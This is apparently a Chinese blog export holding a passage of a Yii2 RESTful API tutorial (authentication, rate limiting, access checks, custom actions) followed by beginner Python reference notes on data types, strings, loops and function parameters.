checkAccess()先看案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657namespace restful\controllers;use Yii;use yii\rest\ActiveController;use yii\data\ActiveDataProvider;use restful\models\ProductModel;# 可以同时实现下面三种验证方法use yii\filters\auth\CompositeAuth;# 浏览器弹窗口输入获取tokenuse yii\filters\auth\HttpBasicAuth;# 从head头获取验证的tokenuse yii\filters\auth\HttpBearerAuth;# 从请求链接中获取验证的tokenuse yii\filters\auth\QueryParamAuth;class ProductController extends ActiveController&#123; public $modelClass = 'restful\models\ProductModel'; /** * 覆盖behaviors方法 * @return [type] [description] */ public function behaviors() &#123; $behaviors = parent::behaviors(); // 重写验证过滤器的配置 $behaviors['authenticator'] = [ 'class' =&gt; HttpBearerAuth::className(), // 可以不验证的action 'optional' =&gt; ['index'] ]; return $behaviors; &#125; /** * 添加额外配置的action * @return [type] [description] */ public function actionSearch() &#123; return Yii::$app-&gt;request-&gt;post(); &#125; /** * 检查用户访问权限，可以参考rbac * @param [type] $action actionId * @param [type] $model 模型对象 * @param array $params * @return [type] [description] */ public function checkAccess($action, $model = null, $params = []) &#123; if ($action === 'update' || $action === 'delete') &#123; if ($model-&gt;order !== Yii::$app-&gt;user-&gt;id) // 不满足抛出异常 throw new \yii\web\ForbiddenHttpException(sprintf('You can only %s articles that you\'ve created.', $action)); &#125; &#125;&#125; 控制器的过滤器解析下面我们主要看一下 behaviors 部分1234567891011121314151617181920212223242526272829yii\rest\Controller 已经给我们配置好了四个public function behaviors()&#123; return [ // 根据请求设置响应格式和语言 'contentNegotiator' =&gt; [ 'class' =&gt; ContentNegotiator::className(), 'formats' =&gt; [ // 这个顺序很重要，如果请求没有设置 Accept:application/json||xml 谁第一个用谁 'application/json' =&gt; Response::FORMAT_JSON, 'application/xml' =&gt; Response::FORMAT_XML, ], ], // 过滤action允许的请求方法 'verbFilter' =&gt; [ 'class' =&gt; VerbFilter::className(), 'actions' =&gt; $this-&gt;verbs(), ], // 验证的 'authenticator' =&gt; [ 'class' =&gt; CompositeAuth::className(), ], // 限制速率的 'rateLimiter' =&gt; [ 'class' =&gt; RateLimiter::className(), ], ];&#125; 格式化响应 contentNegotiator这个配置相对简单，我们只需要在请求头中加入指定响应格式的参数即可获取对应格式的数据123456789101112131415// 根据请求设置响应格式和语言'contentNegotiator' =&gt; [ 'class' =&gt; ContentNegotiator::className(), 'formats' =&gt; [ // 这个顺序很重要，如果请求没有设置 Accept:application/json||xml 谁第一个用谁 'application/json' =&gt; Response::FORMAT_JSON, 'application/xml' =&gt; Response::FORMAT_XML, ],],# 请求头# 接收json格式的数据Accept: application/json;# 接收xml格式的数据Accept: application/xml; 用户验证yii提供了多种验证方法，这里以 HttpBearerAuth 验证(head头获取token)为例 123456789101112131415161718192021222324# 1. 控制器重写behaviors中的用户验证过滤器public function behaviors()&#123; $behaviors = parent::behaviors(); // 重写验证过滤器的配置 $behaviors['authenticator'] = [ 'class' =&gt; HttpBearerAuth::className(), // 可以不验证的action，比方说登录的接口就不需要验证 'optional' =&gt; ['index'] ]; return $behaviors;&#125;# 2. 实现验证token的方法(通过token获取到对应的用户)common\models\User/** * api通过token登陆 * &#123;@inheritdoc&#125; */public static function findIdentityByAccessToken($token, $type = null)&#123; # 为了方便测试直接用的是已经有的 auth_key return static::findOne(['auth_key' =&gt; $token, 'status' =&gt; self::STATUS_ACTIVE]);&#125; 此时，我们就可以通过获取到(通常是通过登录获取到的)的 token 进行请求了123GET rest.yiilearn.com/products 请求头 "Authorization":"Bearer Ah5hD1y-TD0B3VUjoYufZhYoP1ayPTvP" 固定格式 &quot;Authorization&quot;:&quot;Bearer &quot; + $token 速率验证在 实现了用户验证后速率验证才会有用 ，我们需要 User 实现几个方法，如下首先我们需要在 user 表添加两个字段用来存储剩余次数和访问时间 allowance, allowance_updated_at12345678910111213141516171819202122232425262728293031323334353637383940common\models\User实现接口class User extends ActiveRecord implements IdentityInterface,RateLimitInterface实现下面几个方法 /** * 返回一段时间内允许请求的最大次数 * @param [type] $request [description] * @param [type] $action [description] * @return [type] [description] */public function getRateLimit($request, $action)&#123; // 每五秒可以访问2次 return [2, 5];&#125;/** * 获取允许请求的数量和最后的访问的时间戳 * @param [type] $request [description] * @param [type] $action [description] * @return [type] [description] */public function loadAllowance($request, $action)&#123; return [$this-&gt;allowance, $this-&gt;allowance_updated_at];&#125;/** * 保存剩余的请求数量和最后的访问时间 * @param [type] $request [description] * @param [type] $action [description] * @param [type] $allowance [description] * @param [type] $timestamp [description] * @return [type] [description] */public function saveAllowance($request, $action, $allowance, $timestamp)&#123; $this-&gt;allowance = $allowance; $this-&gt;allowance_updated_at = $timestamp; $this-&gt;save();&#125; 实现起来就是这么简单 自定义actionyii配置成 restful 风格的接口确实很快。但我们有时想要额外的添加或重写一些 action ，或者觉得 AR 联表太过麻烦，这是我们就要了解一下逻辑原理然后对其进行扩展 这里有个很重要的点，就是在执行完 action 后，会对action输出的结果记性格式化12345678910111213141516171819202122232425262728293031/** * 处理响应的数据 * &#123;@inheritdoc&#125; */public function afterAction($action, $result)&#123; $result = parent::afterAction($action, $result); return $this-&gt;serializeData($result);&#125;# yii\rest\Serializer 的格式化方法/** * 格式化响应数据的方法 * @param &#123;[type]&#125; $data 响应的数据 * @return &#123;[type]&#125; [description] */public function serialize($data)&#123; // 如果继承模型并且有错误，返回错误信息 if ($data instanceof Model &amp;&amp; $data-&gt;hasErrors()) &#123; return $this-&gt;serializeModelErrors($data); // 如果继承自 Arrayable &#125; elseif ($data instanceof Arrayable) &#123; return $this-&gt;serializeModel($data); // 使用的数据提供器 DataProvider &#125; elseif ($data instanceof DataProviderInterface) &#123; return $this-&gt;serializeDataProvider($data); &#125; // 直接返回数据 return $data;&#125; 也就是说以上两种类型 Arrayable 和 DataProviderInterface 就将会进行格式化，具体的格式化代码自己看( 其中 Model 的 toArray() 方法实现了请求时的资源字段)。所以如果我们想要模仿，也可以输出这两种格式的数据，当然也可以自己处理格式直接输出数据。 扩展 action 的方式 为该控制器的路由配置 extraPatterns 属性 123456789101112&apos;rules&apos; =&gt; [ [ &apos;class&apos; =&gt; &apos;yii\rest\UrlRule&apos;, &apos;controller&apos; =&gt; &apos;product&apos;, ... // 配置额外自定义的访问 // 访问格式如 POST /products/search 可以支持新行为 search &apos;extraPatterns&apos; =&gt; [ &apos;POST search&apos; =&gt; &apos;search&apos;, ], ],], 该控制器添加对应的action 12345678910111213141516171819202122232425/** * 添加额外配置的action * @return [type] [description] */public function actionSearch()&#123; # 直接返回数据 // return Yii::$app-&gt;request-&gt;post(); # 通过 Query 查询 返回 ActiveDataProvider 的方式 $query = (new Query)-&gt;from('meet_product mp') -&gt;leftJoin('meet_color mc', 'mc.color_id = mp.color_id'); return Yii::createObject([ 'class' =&gt; ActiveDataProvider::className(), 'query' =&gt; $query, 'pagination' =&gt; [ // 默认每页显示多少个数据 'defaultPageSize' =&gt; 30, 'params' =&gt; [ // 第几页的参数 'page' =&gt; 1 ], ], ]);&#125; 通过 POST /controllerIds/search 即可访问 删除指定 action删除指定 action ，重写 actions() 删除掉指定的 action123456789public function actions()&#123; $actions = parent::actions(); // 禁用 "delete" 和 "create" 动作 unset($actions['delete'], $actions['create']); return $actions;&#125; 覆盖 action 的方式覆盖的方式不用改路由，但是由于创建action的时候优先 actions() 方法中定义的，所以我们需要先将指定的 action删除掉，参考上面，然后在 Controller 中定义要重写的 action 版本化 &amp;&amp; 错误处理比较简单，直接看官方文档 版本化 错误处理]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>RESTful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python基础1]]></title>
    <url>%2F2018%2F10%2F11%2Fpython%2Fpython%E5%9F%BA%E7%A1%801%2F</url>
    <content type="text"><![CDATA[前言算是一篇记录或摘抄的笔记，方便用来查询基础知识点。 小点查看关键字12import keywordprint(keyword.kwlist) 生成随机数1234import randomrandom.randint(12, 20) # 生成的随机数n: 12 &lt;= n &lt;= 20 random.randint(20, 20) # 结果永远是 20 random.randint(20, 10) # 该语句是错误的，下限必须小于上限 print 输出如果希望输出文字信息的同时，一起输出 数据，就需要使用到 格式化操作符% 被称为 格式化操作符，专门用于处理字符串中的格式包含 % 的字符串，被称为 格式化字符串% 和不同的 字符 连用，不同类型的数据 需要使用 不同的格式化字符 格式化字符 含义 %s 字符串 %d 有符号十进制整数，%06d 表示输出的整数显示位数，不足的地方使用 0 补全 %f 浮点数，%.2f 表示小数点后只显示两位 其他 other 123print("格式化字符串" % 变量1)print("格式化字符串" % (变量1, 变量2...)) print 总是会以一个不可见的“新一行”字符（ \n ）结尾，因此重复调用 print 将会在相互独立的一行中分别打印。为防止打印过程中出现这一换行符，你可以通过 end 指定其应以空白结尾：12345print('a', end='')print('b', end='')输出结果如下：ab 文件开头注释12#!/usr/bin/env python3# -*- coding: utf-8 -*- 第一行注释是为了告诉Linux/OS X系统，这是一个Python可执行程序，可以直接点击执行，Windows系统会忽略这个注释；查看系统python3的命令目录1which python3 第二行注释是为了告诉Python解释器，按照UTF-8编码读取源代码，否则，你在源代码中写的中文输出可能会有乱码。 #!这个符号叫做 Shebang 或者 Sha-bangShebang 通常在 Unix 系统脚本的中 第一行开头 使用指明 执行这个脚本文件 的 解释程序 使用 Shebang 的步骤 使用 which 查询 python3 解释器所在路径 1$ which python3 修改要运行的 主 python 文件，在第一行增加以下内容 1#! /usr/bin/python3 # 路径为which查询到的路径 修改 主 python 文件 的文件权限，增加执行权限 1$ chmod +x cards_main.py 在需要时执行程序即可 1./cards_main.py dir() 方法查看对象内的变量、方法内置的 dir() 函数能够返回由对象(一切皆对象)所定义的变量列表。如果这一对象是一个模块，则该列表会包括函数内所定义的函数、类与变量。 不带参数时表示列出当前模块的，带参数是表示列出参数对象的12345&gt;&gt;&gt; dir()['__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__']&gt;&gt;&gt; import random&gt;&gt;&gt; dir(random)['BPF', 'LOG4', 'NV_MAGICCONST', 'RECIP_BPF', 'Random', 'SG_MAGICCONST', 'SystemRandom', 'TWOPI', '_BuiltinMethodType', '_MethodType', '_Sequence', '_Set', '__all__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', '_acos', '_ceil', '_cos', '_e', '_exp', '_inst', '_log', '_pi', '_random', '_sha512', '_sin', '_sqrt', '_test', '_test_generator', '_urandom', '_warn', 'betavariate', 'choice', 'expovariate', 'gammavariate', 'gauss', 'getrandbits', 'getstate', 'lognormvariate', 'normalvariate', 'paretovariate', 'randint', 'random', 'randrange', 'sample', 'seed', 'setstate', 'shuffle', 'triangular', 'uniform', 'vonmisesvariate', 'weibullvariate'] help() 获取使用帮助获取对象使用的帮助信息 help(random) 其实用不到，可以直接去查看源码嘛 DocStrings 输出函数介绍信息获取函数的文档，也就是备注。按照规定的格式写备注，可以方便的生成使用或接口文档 函数顶部定义的 &#39;&#39;&#39;内容信息&#39;&#39;&#39; 的内容信息 12345678910111213def print_max(x, y): '''Prints the maximum of two numbers. The two values must be integers. ''' # 如果可能， 将其转换至整数类型 x = int(x) y = int(y) if x &lt; y: print('a') else: print('b')print_max(3, 5)print(print_max.__doc__) 格式约定： 该文档字符串所约定的是一串多行字符串，其中第一行以某一大写字母开始，以句号结束。第二行为空行，后跟的第三行开始是任何详细的解释说明。 使用 help() 和 用 pydoc 生成文档时会用到定义的这段文字 eval函数 执行字符串代码eval() 函数十分强大 —— 将字符串 当成 有效的表达式 来求值 并 返回计算结果123456789101112131415# 基本的数学计算In [1]: eval("1 + 1")Out[1]: 2# 字符串重复In [2]: eval("'*' * 10")Out[2]: '**********'# 将字符串转换成列表In [3]: type(eval("[1, 2, 3, 4, 5]"))Out[3]: list# 将字符串转换成字典In [4]: type(eval("&#123;'name': 'xiaoming', 'age': 18&#125;"))Out[4]: dict 判断对象类型type() 判断类型判断基础数据类型12345678910&gt;&gt;&gt; type(123)==type(456)True&gt;&gt;&gt; type(123)==intTrue&gt;&gt;&gt; type('abc')==type('123')True&gt;&gt;&gt; type('abc')==strTrue&gt;&gt;&gt; type('abc')==type(123)False 判断是否是函数123456789101112&gt;&gt;&gt; import types&gt;&gt;&gt; def fn():... pass...&gt;&gt;&gt; type(fn)==types.FunctionTypeTrue&gt;&gt;&gt; type(abs)==types.BuiltinFunctionTypeTrue&gt;&gt;&gt; type(lambda x: x)==types.LambdaTypeTrue&gt;&gt;&gt; type((x for x in range(10)))==types.GeneratorTypeTrue isinstance() 判断继承关系继承关系如下1object -&gt; Animal -&gt; Dog -&gt; Husky 那么，isinstance()就可以告诉我们，一个对象是否是某种类型。先创建3种类型的对象：123&gt;&gt;&gt; a = Animal()&gt;&gt;&gt; d = Dog()&gt;&gt;&gt; h = Husky() 然后，判断：12&gt;&gt;&gt; isinstance(h, Husky)True 能用type()判断的基本类型也可以用isinstance()判断：123456&gt;&gt;&gt; isinstance('a', str)True&gt;&gt;&gt; isinstance(123, int)True&gt;&gt;&gt; isinstance(b'a', bytes)True 并且还可以判断一个变量是否是某些类型中的一种，比如下面的代码就可以判断是否是list或者tuple：1234&gt;&gt;&gt; isinstance([1, 2, 3], (list, tuple))True&gt;&gt;&gt; isinstance((1, 2, 3), (list, tuple))True 基础类型数字型整型 (int)强转方法int() 浮点型（float）强转方法 float() 布尔型（bool） 注意大小写 真 True假 False 运算符 运算符 描述 实例 + 加 10 + 20 = 30 - 减 10 - 20 = -10 * 乘 10 * 20 = 200 / 除 10 / 20 = 0.5 // 取整除 返回除法的整数部分（商） 9 // 2 输出结果 4 % 取余数 返回除法的余数 9 % 2 = 1 ** 幂 又称次方、乘方 2 ** 3 = 8 非数字型包括：字符串、列表、元组、字典 在 Python 中，所有 非数字型变量 都支持以下特点： 都是一个 序列 sequence，也可以理解为 容器 取值 [] 遍历 for in 计算长度、最大/最小值、比较、删除 链接 + 和 重复 * 切片 切片1234567非数字类型[开始索引:结束索引:步长] &apos;ding&apos;[1:2] # &apos;i&apos;&apos;ding&apos;[1:-1] # &apos;in&apos;&apos;ding&apos;[::2] # &apos;dn&apos;&apos;ding&apos;[::-1] # 倒序 &apos;gnid&apos;[&apos;ding&apos;, &apos;bu&apos;, &apos;nao&apos;][1:2:] # [&apos;bu&apos;] Python 内置函数 函数 描述 备注 len(item) 计算容器中元素个数 del(item)/del(item[x]) 删除变量 del item 两种方式 max(item) 返回容器中元素最大值 如果是字典，只针对 key 比较 min(item) 返回容器中元素最小值 如果是字典，只针对 key 比较 运算符 运算符 Python 表达式 结果 描述 支持的数据类型 + [1, 2] + [3, 4] [1, 2, 3, 4] 合并 字符串、列表、元组 * [“Hi!”] * 4 [‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’] 重复 字符串、列表、元组 in 3 in (1, 2, 3) True 元素是否存在 字符串、列表、元组、字典 not in 4 not in (1, 2, 3) True 元素是否不存在 字符串、列表、元组、字典 &gt; &gt;= == &lt; &lt;= (1, 2, 3) &lt; (2, 2, 3) True 元素比较 字符串、列表、元组 in 在对 字典 操作时，判断的是 字典的键 字符串在python中单双引号都是一样的 多行字符串用三引号 &quot;&quot;&quot; 或 &#39;&#39;&#39; 包裹12345'''这是一段多行字符串。这是它的第一行。This is the second line."What's your name?," I asked.He said "Bond, James Bond."''' 在一个字符串中，一个放置在末尾的反斜杠表示字符串将在下一行继续，但不会添加新的一行。来看看例子：12345"This is the first sentence. \This is the second sentence."相当于"This is the first sentence. This is the second sentence." 同样可以用在任何代码中换行的地方1234i = \5等同于i = 5 r’’ 原始字符串如果你需要指定一些未经过特殊处理的字符串，比如转义序列，那么你需要在字符串前增加r 或 R 来指定一个 原始（Raw） 字符串 。下面是一个例子：1234ding = r"Newlines are indicated by \n"print(ding)输出 Newlines are indicated by \n 这样就不用一个一个的去添加转义符 \ 了 所有字符串都是 str 类下的对象。下面的案例将演示这种类之下一些有用的方法。要想获得这些方法的完成清单，你可以查阅 help(str) 。 判断类型相关方法 方法 说明 string.isspace() 如果 string 中只包含空格，则返回 True string.isalnum() 如果 string 至少有一个字符并且所有字符都是字母或数字则返回 True string.isalpha() 如果 string 至少有一个字符并且所有字符都是字母则返回 True string.isdecimal() 如果 string 只包含数字则返回 True，全角数字 string.isdigit() 如果 string 只包含数字则返回 True，全角数字、⑴、\u00b2 string.isnumeric() 如果 string 只包含数字则返回 True，全角数字，汉字数字 string.istitle() 如果 string 是标题化的(每个单词的首字母大写)则返回 True string.islower() 如果 string 中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True string.isupper() 如果 string 中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是大写，则返回 True 查找和替换相关方法 方法 说明 string.startswith(str) 检查字符串是否是以 str 开头，是则返回 True string.endswith(str) 检查字符串是否是以 str 结束，是则返回 True string.find(str, start=0, end=len(string)) 检测 str 是否包含在 string 中，如果 start 和 end 指定范围，则检查是否包含在指定范围内，如果是返回开始的索引值，否则返回 -1 string.rfind(str, start=0, end=len(string)) 类似于 find()，不过是从右边开始查找 string.index(str, start=0, end=len(string)) 跟 find() 方法类似，不过如果 str 不在 string 会报错 string.rindex(str, start=0, end=len(string)) 类似于 index()，不过是从右边开始 string.replace(old_str, new_str, num=string.count(old)) 把 string 中的 old_str 替换成 new_str，如果 num 指定，则替换不超过 num 次 文本对齐相关 方法 说明 string.ljust(width) 返回一个原字符串左对齐，并使用空格填充至长度 width 的新字符串 string.rjust(width) 返回一个原字符串右对齐，并使用空格填充至长度 width 的新字符串 string.center(width) 返回一个原字符串居中，并使用空格填充至长度 width 的新字符串 去除空白字符 方法 说明 string.lstrip() 截掉 string 左边（开始）的空白字符 string.rstrip() 截掉 string 右边（末尾）的空白字符 string.strip() 截掉 string 左右两边的空白字符 拆分和连接相关方法 方法 说明 string.partition(str) 把字符串 string 分成一个 3 元素的元组 (str前面, str, str后面) string.rpartition(str) 类似于 partition() 方法，不过是从右边开始查找 string.split(str=””, num) 以 str 为分隔符拆分 string，如果 num 有指定值，则仅分隔 num + 1 个子字符串，str 默认包含 ‘\r’, ‘\t’, ‘\n’ 和空格 string.splitlines() 按照行(‘\r’, ‘\n’, ‘\r\n’)分隔，返回一个包含各行作为元素的列表 string.join(seq) 以 string 作为分隔符，将 seq 中所有的元素（的字符串表示）合并为一个新的字符串 格式化输出输出带数据的信息% 被称为 格式化操作符，专门用于处理字符串中的格式包含 % 的字符串，被称为 格式化字符串% 和不同的 字符 连用，不同类型的数据 需要使用 不同的格式化字符 格式化字符 含义 %s 字符串 %d 有符号十进制整数，%06d 表示输出的整数显示位数，不足的地方使用 0 补全 %f 浮点数，%.2f 表示小数点后只显示两位 %% 输出 % 语法格式：123print("格式化字符串" % 变量1)print("格式化字符串" % (变量1, 变量2...)) 示例：1234print("我的名字叫 %s，请多多关照！" % name)print("我的学号是 %06d" % student_no)print("苹果单价 %.02f 元／斤，购买 %.02f 斤，需要支付 %.02f 元" % (price, weight, money))print("数据比例是 %.02f%%" % (scale * 100)) format() 拼接字符串&amp;格式化相对于拼接可能方便一点123456789101112131415age = 20name = 'Swaroop'print('&#123;0&#125; was &#123;1&#125; years old when he wrote this book'.format(name, age))print('Why is &#123;0&#125; playing with that python?'.format(name))等同于 age = 20name = 'Swaroop'print('&#123;&#125; was &#123;&#125; years old when he wrote this book'.format(name, age))print('Why is &#123;&#125; playing with that python?'.format(name))输出：$ python str_format.pySwaroop was 20 years old when he wrote this bookWhy is Swaroop playing with that python? 格式化替换的数据1234567# 对于浮点数 '0.333' 保留小数点(.)后三位print('&#123;0:.3f&#125;'.format(1.0/3))# 使用下划线填充文本，并保持文字处于中间位置# 使用 (^) 定义 '___hello___'字符串长度为 11print('&#123;0:_^11&#125;'.format('hello'))# 基于关键词输出 'Swaroop wrote A Byte of Python'print('&#123;name&#125; wrote &#123;book&#125;'.format(name='Swaroop', book='A Byte of Python')) len() decode() encode() 字节由于Python的字符串类型是str，在内存中以Unicode表示，一个字符对应若干个字节。如果要在网络上传输，或者保存到磁盘上，就需要把str变为以字节为单位的bytes。Python对bytes类型的数据用带b前缀的单引号或双引号表示：1x = b'ABC' 如果我们从网络或磁盘上读取了字节流，那么读到的数据就是bytes。要把bytes变为str，就需要用decode()方法：1234&gt;&gt;&gt; b'ABC'.decode('ascii')'ABC'&gt;&gt;&gt; b'\xe4\xb8\xad\xe6\x96\x87'.decode('utf-8')'中文' 如果bytes中只有一小部分无效的字节，可以传入errors=’ignore’忽略错误的字节：12&gt;&gt;&gt; b'\xe4\xb8\xad\xff'.decode('utf-8', errors='ignore')'中' 要计算str包含多少个字符，可以用len()函数：1234&gt;&gt;&gt; len('ABC')3&gt;&gt;&gt; len('中文')2 len()函数计算的是str的字符数，如果换成bytes，len()函数就计算字节数：123456&gt;&gt;&gt; len(b'ABC')3&gt;&gt;&gt; len(b'\xe4\xb8\xad\xe6\x96\x87')6&gt;&gt;&gt; len('中文'.encode('utf-8'))6 列表List 数组定义列表1ding = ['ding', 'bunao'] 列表常用操作 序号 分类 关键字 、 函数 、 方法 说明 1 增加 列表.insert(索引, 数据) 在指定位置插入数据 列表.append(数据) 在末尾追加数据 列表.extend(列表2) 将列表2 的数据追加到列表 2 修改 列表[索引] = 数据 修改指定索引的数据 3 删除 del 列表[索引] 删除指定索引的数据 列表.remove[数据] 删除第一个出现的指定数据 列表.pop 删除末尾数据 列表.pop(索引) 删除指定索引数据 列表.clear 清空列表 4 统计 len(列表) 列表长度 列表.count(数据) 数据在列表中出现的次数 5 排序 列表.sort() 升序排序 列表.sort(reverse=True) 降序排序 列表.reverse() 逆序、反转 6 索引 元组.index(数据) 获取数据第一次出现的索引，如果不存在会报异常 列表生成式要生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]可以用 list(range(1, 11))如果要生成[1x1, 2x2, 3x3, …, 10x10]怎么做？方法一是循环：123456&gt;&gt;&gt; L = []&gt;&gt;&gt; for x in range(1, 11):... L.append(x * x)...&gt;&gt;&gt; L[1, 4, 9, 16, 25, 36, 49, 64, 81, 100] 而列表生成式则可以用一行语句代替循环生成上面的list：12&gt;&gt;&gt; [x * x for x in range(1, 11)][1, 4, 9, 16, 25, 36, 49, 64, 81, 100] 筛选出仅偶数的平方：12&gt;&gt;&gt; [x * x for x in range(1, 11) if x % 2 == 0][4, 16, 36, 64, 100] 还可以使用两层循环，可以生成全排列：12&gt;&gt;&gt; [m + n for m in 'ABC' for n in 'XYZ']['AX', 'AY', 'AZ', 'BX', 'BY', 'BZ', 'CX', 'CY', 'CZ'] 元组 Tuple元组和列表一样，只是元组不能修改(“指向不变”（引用的地址不变），如果指向的是一个可变的如list和对象，只要引用的地址不变，值是可以改变的)定义形式1info = (&apos;a&apos;, 1, 3) 只定义一个元素时由于()的歧义也要加 ,1info = (&apos;a&apos;,) 元组的常用操作 序号 分类 关键字 、 函数 、 方法 说明 1 统计 len(元组) 元组长度 元组.count(数据) 数据在元组中出现的次数 2 索引 元组.index(数据) 获取数据第一次出现的索引 和列表互转12list(元组) 元组转列表tuple(列表) 列表转元组 字典 dictionary定义形式1234xiaoming = &#123;"name": "小明", "age": 18, "gender": True, "height": 1.75&#125; 字典的常用操作 序号 分类 关键字/函数/方法 说明 1 取值 字典[key] 取值，如果不存在则报错 1 取值 字典.get(key) 取值，如果不存在也不报错，默认返回 None，也可以指定不存在时返回值 `.get(‘key’, 666) 2 修改/添加 字典[key] = 数据 修改指定key的数据，如果不存在则添加 添加 字典.setdefault(key, value) 如果key存在则不修改，不存在则添加 3 删除 del 字典[key] 删除指定key的数据 字典.pop(key) 删除指定key数据 字典.popitem() 随机删除一个 字典.clear() 清空字典 4 统计 len(字典) 字典长度 字典.keys() 所有key列表 字典.values() 所有value列表 字典.items() 所有(key, value)元组列表 集合 setset和字典dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key。 要创建一个set，需要提供一个list作为输入集合：123&gt;&gt;&gt; s = set([1, 2, 3, 3])&gt;&gt;&gt; s&#123;1, 2, 3&#125; 通过 add(key) 方法可以添加元素到set中，可以重复添加，但不会有效果：123456&gt;&gt;&gt; s.add(4)&gt;&gt;&gt; s&#123;1, 2, 3, 4&#125;&gt;&gt;&gt; s.add(4)&gt;&gt;&gt; s&#123;1, 2, 3, 4&#125; 通过 remove(key) 方法可以删除元素：123&gt;&gt;&gt; s.remove(4)&gt;&gt;&gt; s&#123;1, 2, 3&#125; set可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集等操作：123456&gt;&gt;&gt; s1 = set([1, 2, 3])&gt;&gt;&gt; s2 = set([2, 3, 4])&gt;&gt;&gt; s1 &amp; s2&#123;2, 3&#125;&gt;&gt;&gt; s1 | s2&#123;1, 2, 3, 4&#125; 基础语句if 语句123456789101112if 条件1: 条件1满足执行的代码 ……elif 条件2: 条件2满足时，执行的代码 ……elif 条件3: 条件3满足时，执行的代码 ……else: 以上条件都不满足时，执行的代码 …… 逻辑运算符逻辑运算符 包括：与 and 或 or 非 not 三种 迭代 for in1for ... in dict类型1234567&gt;&gt;&gt; d = &#123;'a': 1, 'b': 2, 'c': 3&#125;&gt;&gt;&gt; for key in d:... print(key)...acb 如何判断一个对象是可迭代对象呢？方法是通过 collections 模块的 Iterable 类型判断：12345678910111213141516&gt;&gt;&gt; from collections import Iterable&gt;&gt;&gt; isinstance('abc', Iterable) # str是否可迭代True&gt;&gt;&gt; isinstance([1,2,3], Iterable) # list是否可迭代True&gt;&gt;&gt; isinstance(123, Iterable) # 整数是否可迭代False``` Python内置的enumerate函数可以把一个list变成索引-元素对，这样就可以在for循环中同时迭代索引和元素本身：```python&gt;&gt;&gt; for i, value in enumerate(['A', 'B', 'C']):... print(i, value)...0 A1 B2 C 同时引用两个变量还有下面这种123456&gt;&gt;&gt; for x, y in [(1, 1), (2, 4), (3, 9)]:... print(x, y)...1 12 43 9 while循环123456789101112131415161718# 0. 最终结果result = 0# 1. 计数器i = 0# 2. 开始循环while i &lt;= 100: # 判断偶数 if i % 2 == 0: print(i) result += i # 处理计数器 i += 1print("0~100之间偶数求和结果 = %d" % result) 退出当前循环 break 和 跳当前此次循环 continue函数函数的文档注释在开发中，如果希望给函数添加注释，应该在 定义函数 的下方，使用 连续的三对引号在 连续的三对引号 之间编写对函数的说明文字12345"""这是一个多行注释在多行注释之间，可以写很多很多的内容……""" 变量 作用域123456789101112131415161718d = ['ding', 'a']s = 'ding'g_s = 'ding'gl_list = [4, 5, 6]def demo1(al, num_list): al.append('bunao') d.append('yes') num_list = [1, 2, 3] s = 'bunao' global g_s g_s = 'bunao'demo(d, gl_list)print(gl_list) # [4, 5, 6]print(d) # ['ding', 'a', 'bunao', 'yes']print(g_d) # ['ding', 'a']print(s) # dingprint(g_s) # bunao 列表、字典、对象这些可变类型作为函数的参数，函数内改变他们会影响到函数外的实参，但是赋值语句相当于修改了引用所以不会影响外部 列表变量调用 += 赋值, 本质上是在执行列表变量的 extend 方法,所以会影响外部 当不使用 global 关键字的时候，函数内用全局的变量都是复制了一份，更改不会影响到函数外 函数参数缺省参数(默认参数) 缺省的参数必须放在最后 1def print_info(name, title, gender=True): 当多个缺省参数时，调用的时候需要指定参数名 123456def print_info(name, title="", gender=True): ……print_info("老王", title="班长")print_info("小美", gender=False)print_info(gender=False, name="小美") 默认参数必须指向不变对象！ 123def add_end(L=[]): L.append('END') return L 当你正常调用时，结果似乎不错：1234&gt;&gt;&gt; add_end([1, 2, 3])[1, 2, 3, 'END']&gt;&gt;&gt; add_end(['x', 'y', 'z'])['x', 'y', 'z', 'END'] 当你使用默认参数调用时，一开始结果也是对的：12&gt;&gt;&gt; add_end()['END'] 但是，再次调用add_end()时，结果就不对了：1234&gt;&gt;&gt; add_end()['END', 'END']&gt;&gt;&gt; add_end()['END', 'END', 'END'] 原因解释如下： Python函数在定义的时候，默认参数L的值就被计算出来了，即[]，因为默认参数L也是一个变量，它指向对象[]，每次调用该函数，如果改变了L的内容，则下次调用时，默认参数的内容就变了，不再是函数定义时的[]了。 多值参数python 中有 两种 多值参数： 参数名前增加 一个 * 可以接收 元组 , 常用 *args 表示 可变参数 参数名前增加 两个 * 可以接收 字典 , 常用 **kwargs 表示, 关键字参数 12345678def demo(num, *args, **kwargs): print(num) print(args) print(kwargs)demo(1, 2, 3, 4, 5, name="小明", age=18, gender=True) 除了需要的参数，其他的不带参数名的会合并为 args 元组，带参数名的合并为 kwargs 字典 元组和字典的拆包如果想要把元组和字典直接传递给定义的多值参数，就需要拆包拆包 的方式是：在 元组变量前，增加 一个 在 字典变量前，增加 两个 12345678910111213def demo(*args, **kwargs): print(args) print(kwargs)# 需要将一个元组变量/字典变量传递给函数对应的参数gl_nums = (1, 2, 3)gl_xiaoming = &#123;"name": "小明", "age": 18&#125;# 会把 num_tuple 和 xiaoming 作为元组传递个 args# demo(gl_nums, gl_xiaoming)demo(*gl_nums, **gl_xiaoming) 命名关键字参数对于关键字参数，函数的调用者可以传入任意不受限制的关键字参数。至于到底传入了哪些，就需要在函数内部通过kw检查。 以person()函数为例，我们希望检查是否有city和job参数：12345678def person(name, age, **kw): if 'city' in kw: # 有city参数 pass if 'job' in kw: # 有job参数 pass print('name:', name, 'age:', age, 'other:', kw) 如果要限制关键字参数的名字，就可以用命名关键字参数，例如，只接收city和job作为关键字参数。这种方式定义的函数如下：12def person(name, age, *, city, job): print(name, age, city, job) 和关键字参数 **kw 不同，命名关键字参数需要一个特殊分隔符 * ，* 后面的参数被视为命名关键字参数。 调用方式如下：12&gt;&gt;&gt; person('Jack', 24, city='Beijing', job='Engineer')Jack 24 Beijing Engineer 